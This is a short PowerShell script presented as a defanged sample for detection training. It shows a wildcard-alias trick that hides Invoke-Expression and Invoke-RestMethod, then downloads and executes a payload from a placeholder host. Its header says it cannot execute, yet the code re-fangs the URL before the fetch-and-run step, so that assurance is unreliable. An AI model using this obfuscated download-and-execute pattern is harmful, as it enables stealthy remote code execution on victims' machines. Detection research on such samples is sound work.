<#
    Sync-Assets.ps1  (SYNTHETIC / DEFANGED — for detection training only)

    Reconstructed for training purposes, modeled on the STEEP#MAVERICK
    wildcard alias/command resolution pattern that motivated the ATT&CK
    submission of T1027.010 (Command Obfuscation). Domain is a placeholder
    (RFC 2606-style) and is defanged (hxxps / [.]) — this is NOT a live
    payload and will not resolve or execute anything.
#>

$stagingUrl = "hxxps://updates-cdn.contoso-corp[.]test/assets/payload.txt"

# Resolve Invoke-Expression indirectly via a wildcard alias lookup instead
# of ever typing the cmdlet/alias name literally.
$resolved = Get-Alias -Name 'i*x' | Select-Object -First 1

# Same trick against Get-Command, resolving Invoke-RestMethod without the
# literal cmdlet name ever appearing in the script.
$fetcher = (Get-Command '*restm*')[0]

$defangedUrl = $stagingUrl.Replace('hxxps', 'https').Replace('[.]', '.')
$payload = & $fetcher.Name $defangedUrl

& $resolved.Name $payload
